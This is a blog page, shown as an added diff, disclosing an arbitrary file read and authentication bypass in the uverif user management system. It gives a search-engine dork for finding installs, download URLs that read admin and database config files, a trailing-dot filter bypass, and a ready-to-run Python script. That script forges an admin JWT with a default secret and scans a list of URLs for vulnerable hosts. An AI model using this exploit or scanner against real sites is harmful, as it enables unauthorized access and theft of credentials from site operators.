@@ -1,0 +1,825 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://syst1m-1252489059.cos.ap-beijing.myqcloud.com/syst1m.cn/favicon.ico">
+  <link rel="icon" href="https://syst1m-1252489059.cos.ap-beijing.myqcloud.com/syst1m.cn/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="076w">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="U验证网络用户管理系统存在任意文件读取漏洞 (There is an arbitrary file reading vulnerability in the U-verification network user management system.)搜索引擎(search engine): body&#x3D;”U用户验证系统1.0” 官网(Official website): https:&#x2F;&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="U验证网络用户管理系统_任意文件读取漏洞">
+<meta property="og:url" content="http://syst1m.cn/2024/01/22/U%E9%AA%8C%E8%AF%81%E7%BD%91%E7%BB%9C%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="076w&#39;s World">
+<meta property="og:description" content="U验证网络用户管理系统存在任意文件读取漏洞 (There is an arbitrary file reading vulnerability in the U-verification network user management system.)搜索引擎(search engine): body&#x3D;”U用户验证系统1.0” 官网(Official website): https:&#x2F;&#x2F;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://syst1m-1252489059.cos.ap-beijing.myqcloud.com/syst1m.cn/1705894481903-3d32f3f7-6fed-4885-9718-1b605465af46.png">
+<meta property="og:image" content="https://syst1m-1252489059.cos.ap-beijing.myqcloud.com/syst1m.cn/1705894551343-fcdeda81-5f1b-407c-81d5-c467f0c858eb.png">
+<meta property="og:image" content="https://syst1m-1252489059.cos.ap-beijing.myqcloud.com/syst1m.cn/1705893018332-a1cc1710-ef73-4e3e-b5f2-d338488e56bf.png">
+<meta property="og:image" content="https://syst1m-1252489059.cos.ap-beijing.myqcloud.com/syst1m.cn/1705893113623-f942d087-e2f2-4dbd-b6b3-7936dca98f32.png">
+<meta property="og:image" content="https://syst1m-1252489059.cos.ap-beijing.myqcloud.com/syst1m.cn/1705893242538-34d8271f-5c5c-4e96-b33a-a53de1a36145.png">
+<meta property="og:image" content="https://syst1m-1252489059.cos.ap-beijing.myqcloud.com/syst1m.cn/1705893779210-01d5b52a-06ac-4e70-83a2-452d0dfc3b74.png">
+<meta property="og:image" content="https://syst1m-1252489059.cos.ap-beijing.myqcloud.com/syst1m.cn/1705893997671-db1169a2-ae52-4eae-b2a3-989030c0515c.png">
+<meta property="og:image" content="https://syst1m-1252489059.cos.ap-beijing.myqcloud.com/syst1m.cn/1705894167477-4d9e8e3a-24bb-47cb-baad-ae248f997589.png">
+<meta property="og:image" content="https://syst1m-1252489059.cos.ap-beijing.myqcloud.com/syst1m.cn/1705897650907-2f13b7a4-9f97-4b92-a861-f85e19b47f7a.png">
+<meta property="og:image" content="https://syst1m-1252489059.cos.ap-beijing.myqcloud.com/syst1m.cn/1705898354739-f7e7f163-803d-4db3-9888-7d84385a9acf.png">
+<meta property="og:image" content="https://syst1m-1252489059.cos.ap-beijing.myqcloud.com/syst1m.cn/1705898595336-405d4670-bf97-4c87-923a-c44faa07ab42.png">
+<meta property="og:image" content="https://syst1m-1252489059.cos.ap-beijing.myqcloud.com/syst1m.cn/1705899196889-135fe24c-f69d-4752-a163-e77f4e504cfb.png">
+<meta property="og:image" content="https://syst1m-1252489059.cos.ap-beijing.myqcloud.com/syst1m.cn/1705899261854-265d0aca-20ea-42ba-9adb-2f9bebe4cec8.png">
+<meta property="article:published_time" content="2024-01-22T06:02:40.000Z">
+<meta property="article:modified_time" content="2024-01-22T06:04:25.642Z">
+<meta property="article:author" content="076w">
+<meta property="article:tag" content="原创漏洞">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://syst1m-1252489059.cos.ap-beijing.myqcloud.com/syst1m.cn/1705894481903-3d32f3f7-6fed-4885-9718-1b605465af46.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>U验证网络用户管理系统_任意文件读取漏洞 - 076w&#39;s World</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"syst1m.cn","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>076w&#39;s World</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" target="_blank" rel="noopener" href="https://www.yuque.com/076w">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://syst1m-1252489059.cos.ap-beijing.myqcloud.com/syst1m.cn/home_top_bg.webp') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="U验证网络用户管理系统_任意文件读取漏洞"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        076w
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-01-22 14:02" pubdate>
+          2024年1月22日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          64 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">U验证网络用户管理系统_任意文件读取漏洞</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：几秒前
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="U验证网络用户管理系统存在任意文件读取漏洞-There-is-an-arbitrary-file-reading-vulnerability-in-the-U-verification-network-user-management-system"><a href="#U验证网络用户管理系统存在任意文件读取漏洞-There-is-an-arbitrary-file-reading-vulnerability-in-the-U-verification-network-user-management-system" class="headerlink" title="U验证网络用户管理系统存在任意文件读取漏洞 (There is an arbitrary file reading vulnerability in the U-verification network user management system.)"></a>U验证网络用户管理系统存在任意文件读取漏洞 (There is an arbitrary file reading vulnerability in the U-verification network user management system.)</h2><p>搜索引擎(search engine): body&#x3D;”U用户验证系统1.0”</p>
+<p>官网(Official website): <a target="_blank" rel="noopener" href="https://user.uverif.com/">https://user.uverif.com/</a></p>
+<p>Github: <a target="_blank" rel="noopener" href="https://github.com/51154393/uverif">https://github.com/51154393/uverif</a></p>
+<p>Gitee: <a target="_blank" rel="noopener" href="https://gitee.com/dagg/uverif">https://gitee.com/dagg/uverif</a></p>
+<h2 id="后台任意文件读取-Read-any-file-in-the-background"><a href="#后台任意文件读取-Read-any-file-in-the-background" class="headerlink" title="后台任意文件读取 (Read any file in the background)"></a>后台任意文件读取 (Read any file in the background)</h2><p>当前最新版本为v2.0.4-beta (The latest current version is v2.0.4-beta)</p>
+<p><img src="https://syst1m-1252489059.cos.ap-beijing.myqcloud.com/syst1m.cn/1705894481903-3d32f3f7-6fed-4885-9718-1b605465af46.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>其漏洞点在于登录后台后生成卡密导出的下载处 (The vulnerability lies in the download place where the card password is exported after logging in to the backend.)</p>
+<p><img src="https://syst1m-1252489059.cos.ap-beijing.myqcloud.com/syst1m.cn/1705894551343-fcdeda81-5f1b-407c-81d5-c467f0c858eb.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/admin/download?path=./app/data/kami/202401210556174.txt">http://127.0.0.1/admin/download?path=./app/data/kami/202401210556174.txt</a></p>
+<p><img src="https://syst1m-1252489059.cos.ap-beijing.myqcloud.com/syst1m.cn/1705893018332-a1cc1710-ef73-4e3e-b5f2-d338488e56bf.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>修改路径即可构造任意文件读取,  “.&#x2F;“代表当前目录,可读取数据库配置文件,当前管理员账户密码等  (Modify the path to construct any file to read, “.&#x2F;“ represents the current directory, and can read the database configuration file, current administrator account password, etc.)</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/admin/download?path=./config/admin.php">http://127.0.0.1/admin/download?path=./config/admin.php</a></p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/admin/download?path=./config/config.php">http://127.0.0.1/admin/download?path=./config/config.php</a></p>
+<p><img src="https://syst1m-1252489059.cos.ap-beijing.myqcloud.com/syst1m.cn/1705893113623-f942d087-e2f2-4dbd-b6b3-7936dca98f32.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://syst1m-1252489059.cos.ap-beijing.myqcloud.com/syst1m.cn/1705893242538-34d8271f-5c5c-4e96-b33a-a53de1a36145.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>查看源码(View source code)  <a target="_blank" rel="noopener" href="https://github.com/51154393/uverif/blob/main/Ue/tools/download.php">https://github.com/51154393/uverif/blob/main/Ue/tools/download.php</a></p>
+<p><img src="https://syst1m-1252489059.cos.ap-beijing.myqcloud.com/syst1m.cn/1705893779210-01d5b52a-06ac-4e70-83a2-452d0dfc3b74.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>这是一个PHP命名空间为Ue\tools的类download的代码。该类提供了一个静态方法download，用于下载文件。</p>
+<p>方法接受两个参数：$filename表示要下载的文件路径，$downLoadName表示下载时保存的文件名（可选，默认为原始文件名）。</p>
+<p>该方法的主要逻辑如下：</p>
+<ol>
+<li>首先检查$downLoadName是否为空，如果为空则将其设为$filename。</li>
+<li>检查$filename中是否包含.，如果不包含则返回false，表示无法确定文件类型。</li>
+<li>设置响应的MIME类型为application&#x2F;octet-stream，表示通用的二进制文件类型。</li>
+<li>使用fopen函数以只读方式打开文件，并通过fread函数读取文件的内容。</li>
+<li>关闭文件句柄。</li>
+<li>判断客户端的HTTP_USER_AGENT中是否包含”MSIE”，如果是，则设置一系列响应头信息，包括Content-Type、Content-Disposition等，以支持在IE浏览器中下载文件。</li>
+<li>如果不是IE浏览器，则设置另一组响应头信息。</li>
+<li>最后使用exit函数输出文件内容，并结束脚本的执行。</li>
+</ol>
+<p>This is a code for class download in the PHP namespace Ue\tools. This class provides a static method download for downloading files.<br>The method accepts two parameters: $filename represents the path of the file to be downloaded, $downLoadName represents the file name saved during downloading (optional, defaults to the original file name).<br>The main logic of this method is as follows:</p>
+<ol>
+<li>First check whether $downLoadName is empty, and if it is empty, set it to $filename.</li>
+<li>Check whether $filename contains ., if not, return false, indicating that the file type cannot be determined.</li>
+<li>Set the response MIME type to application&#x2F;octet-stream, which represents a common binary file type.</li>
+<li>Use the fopen function to open the file in read-only mode, and read the contents of the file through the fread function.</li>
+<li>Close the file handle.</li>
+<li>Determine whether the client’s HTTP_USER_AGENT contains “MSIE”. If so, set a series of response header information, including Content-Type, Content-Disposition, etc., to support downloading files in the IE browser.</li>
+<li>If it is not an IE browser, set another set of response header information.</li>
+<li>Finally, use the exit function to output the file content and end the execution of the script.</li>
+</ol>
+<p>当前搭建环境为Windows系统且检查$filename中是否包含”.”,所以尝试读取win.ini文件(The current build environment is a Windows system and check whether $filename contains “.”, so try to read the win.ini file)</p>
+<p>C:\Windows\win.ini</p>
+<p><img src="https://syst1m-1252489059.cos.ap-beijing.myqcloud.com/syst1m.cn/1705893997671-db1169a2-ae52-4eae-b2a3-989030c0515c.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>尝试读取hosts文件,检查“.”所以在hosts文件后加“.”(Try to read the hosts file and check “.” so add “.” after the hosts file.)</p>
+<p>原理是Windows系统默认删除文件后缀的“.”和空格。若网站后端过滤时没有过滤末尾的点，便可进行绕过。(The principle is that the Windows system deletes the “.” and spaces in the file suffix by default. If the back-end filtering of the website does not include the dot at the end of the filter, it can be bypassed.)</p>
+<p>C:\Windows\System32\drivers\etc\hosts.</p>
+<p><img src="https://syst1m-1252489059.cos.ap-beijing.myqcloud.com/syst1m.cn/1705894167477-4d9e8e3a-24bb-47cb-baad-ae248f997589.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>尝试读取linux系统下文件(Try to read files under linux system)</p>
+<p>&#x2F;etc&#x2F;resolv.conf</p>
+<p><img src="https://syst1m-1252489059.cos.ap-beijing.myqcloud.com/syst1m.cn/1705897650907-2f13b7a4-9f97-4b92-a861-f85e19b47f7a.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="前台任意文件读取-Read-any-file-in-the-foreground"><a href="#前台任意文件读取-Read-any-file-in-the-foreground" class="headerlink" title="前台任意文件读取(Read any file in the foreground)"></a>前台任意文件读取(Read any file in the foreground)</h2><p>尝试扩大危害,将漏洞升级 (Try to expand the harm and upgrade the vulnerability)</p>
+<p>观察 Cookie 字段中 admcookies 为 jwt 加密,尝试解密 (Observe that admcookies in the Cookie field is encrypted by jwt and try to decrypt it.)</p>
+<p><img src="https://syst1m-1252489059.cos.ap-beijing.myqcloud.com/syst1m.cn/1705898354739-f7e7f163-803d-4db3-9888-7d84385a9acf.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>查看源码分析构造 (View source code analysis structure)</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/51154393/uverif/blob/main/Ue/tools/Jwt.php">https://github.com/51154393/uverif/blob/main/Ue/tools/Jwt.php</a></p>
+<p><img src="https://syst1m-1252489059.cos.ap-beijing.myqcloud.com/syst1m.cn/1705898595336-405d4670-bf97-4c87-923a-c44faa07ab42.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>JWT（JSON Web Token）是一种用于身份验证和授权的开放标准。它由三部分组成：头部（header）、载荷（payload）和签名（signature）。</p>
+<p>在给定的代码中，JWT的参数生成如下：</p>
+<ol>
+<li>头部（header）：使用算法HS256（HMAC SHA-256）生成签名，在代码中表示为’alg’ &#x3D;&gt; ‘HS256’。</li>
+<li>载荷（payload）：包含了一些声明信息，可根据需要自定义。在代码中，载荷包含以下字段：</li>
+</ol>
+<ul>
+<li>iss：表示该JWT的签发者。</li>
+<li>iat：表示签发时间，使用time()函数获取当前时间。</li>
+<li>exp：表示过期时间，当前时间加上24小时。</li>
+<li>nbf：该时间之前不接收处理该Token。</li>
+<li>sub：表示面向的用户，默认为当前请求的域名。</li>
+<li>jti：表示该Token的唯一标识，使用md5(uniqid(‘JWT’) . time())生成。</li>
+<li>claim：表示自定义数据，可根据需要设置。</li>
+</ul>
+<ol>
+<li>签名（signature）：使用密钥（key）对头部和载荷进行签名生成。签名算法使用HS256，通过调用self::signature()方法实现。</li>
+</ol>
+<p>最终，通过将base64编码后的头部、载荷和签名拼接在一起，并用”.”分隔，形成JWT Token。</p>
+<p>JWT (JSON Web Token) is an open standard for authentication and authorization. It consists of three parts: header, payload and signature.<br>In the given code, the parameters of the JWT are generated as follows:</p>
+<ol>
+<li>Header: Use algorithm HS256 (HMAC SHA-256) to generate a signature, represented in the code as ‘alg’ &#x3D;&gt; ‘HS256’.</li>
+<li>Payload: Contains some declaration information and can be customized as needed. In the code, the payload contains the following fields:<br>○ iss: Indicates the issuer of the JWT.<br>○ iat: indicates the issuance time, use the time() function to obtain the current time.<br>○ exp: Indicates the expiration time, the current time plus 24 hours.<br>○ nbf: The Token will not be received or processed before this time.<br>○ sub: Indicates the user targeted, defaulting to the currently requested domain name.<br>○ jti: Represents the unique identifier of the Token, generated using md5(uniqid(‘JWT’) . time()).<br>○ claim: Indicates custom data, which can be set as needed.</li>
+<li>Signature: Use the key to generate signatures for the header and payload. The signature algorithm uses HS256 and is implemented by calling the self::signature() method.<br>Finally, the JWT Token is formed by splicing the base64-encoded header, payload and signature together and separating them with “.”.</li>
+</ol>
+<p>尝试写python脚本构造jwt,写出poc (Try to write a python script to construct jwt and write a poc)</p>
+<p>url.txt存放检测的url,源码直接运行,无需修改 (url.txt stores the detected URL, and the source code can be run directly without modification.)</p>
+<p><img src="https://syst1m-1252489059.cos.ap-beijing.myqcloud.com/syst1m.cn/1705899196889-135fe24c-f69d-4752-a163-e77f4e504cfb.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs plain">import requests<br>import jwt<br>import hashlib<br>import re<br>import time<br><br>one_day = 24 * 60 * 60  # 一天的秒数<br># 生成头部<br>header = &#123;<br>    &quot;alg&quot;: &quot;HS256&quot;,<br>    &quot;typ&quot;: &quot;JWT&quot;<br>&#125;<br># 使用密钥进行签名<br>secret = &quot;your-256-bit-secret&quot;<br><br>vulnerable_urls = []<br><br>with open(&#x27;url.txt&#x27;) as file:<br>    for url in file:<br>        url = url.strip()<br>        try:<br>            response = requests.get(url, verify=False, timeout=10)<br>        except requests.exceptions.Timeout:<br>            print(f&quot;&#123;url&#125; 请求超时，跳过&quot;)<br>            continue<br><br>        if response.status_code == requests.codes.ok:<br>            session_id = response.cookies.get(&#x27;PHPSESSID&#x27;)<br>        else:<br>            continue<br><br>        unique_id = hashlib.md5(str(time.time()).encode(&#x27;utf-8&#x27;)).hexdigest()<br>        sub = re.sub(r&#x27;^https?:\/\/&#x27;, &#x27;&#x27;, url)<br>        # 去除冒号后所有内容<br>        sub = re.sub(r&#x27;:.*$&#x27;, &#x27;&#x27;, url)<br>        # 生成载荷<br>        payload = &#123;<br>            &quot;iss&quot;: &quot;admin&quot;,<br>            &quot;iat&quot;: int(time.time()),<br>            &quot;exp&quot;: int(time.time()) + one_day,  # 过期时间为当前时间后一天<br>            &quot;nbf&quot;: int(time.time()),  # 生效时间为当前时间<br>            &quot;sub&quot;: sub,<br>            &quot;jti&quot;: unique_id,<br>            &quot;claim&quot;: None<br>        &#125;<br><br>        token = jwt.encode(payload, secret, algorithm=&quot;HS256&quot;, headers=header)<br><br>        headers = &#123;<br>            &#x27;Accept&#x27;: &#x27;application/json, text/javascript, */*; q=0.01&#x27;,<br>            &#x27;X-Requested-With&#x27;: &#x27;XMLHttpRequest&#x27;,<br>            &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36&#x27;,<br>            &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded; charset=UTF-8&#x27;,<br>            &#x27;Cookie&#x27;: f&#x27;PHPSESSID=&#123;session_id&#125;; admcookies=&#123;token&#125;; appid=1000&#x27;,<br>            &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;,<br>            &#x27;Accept-Language&#x27;: &#x27;zh-CN,zh;q=0.9,en;q=0.8&#x27;<br>        &#125;<br>        data = &#123;<br>            &#x27;user&#x27;: &#x27;testtesttest&#x27;,		# 任意填写<br>            &#x27;password&#x27;: &#x27;testtesttest&#x27;		# 任意填写<br>        &#125;<br>        print(&quot;Cookie: &quot;+f&#x27;PHPSESSID=&#123;session_id&#125;; admcookies=&#123;token&#125;; appid=1000&#x27;)<br>        response = requests.post(f&quot;&#123;url&#125;/admin.php&quot;, headers=headers, data=data, verify=False)<br><br>        file = requests.get(f&quot;&#123;url&#125;/admin/download?path=./config/admin.php&quot;, headers=headers, data=data, allow_redirects=False, verify=False)<br>        if &quot;管理员配置&quot; in file.text:<br>            vulnerable_urls.append(url)<br>            print(url+&quot;/admin.php&quot;,   file.text)<br>            with open(&#x27;存在漏洞存在.txt&#x27;, &#x27;w&#x27;) as file:<br>                for url in vulnerable_urls:<br>                    file.write(url + &#x27;\n&#x27;)<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://syst1m-1252489059.cos.ap-beijing.myqcloud.com/syst1m.cn/1705899261854-265d0aca-20ea-42ba-9adb-2f9bebe4cec8.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%AC%94%E8%AE%B0/" class="category-chain-item">笔记</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E7%AC%94%E8%AE%B0/%E5%8E%9F%E5%88%9B%E6%BC%8F%E6%B4%9E/" class="category-chain-item">原创漏洞</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%8E%9F%E5%88%9B%E6%BC%8F%E6%B4%9E/" class="print-no-link">#原创漏洞</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>U验证网络用户管理系统_任意文件读取漏洞</div>
+      <div>http://syst1m.cn/2024/01/22/U验证网络用户管理系统_任意文件读取漏洞/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>076w</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年1月22日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/11/03/Clicker_Medium/" title="Clicker_Medium">
+                        <span class="hidden-mobile">Clicker_Medium</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
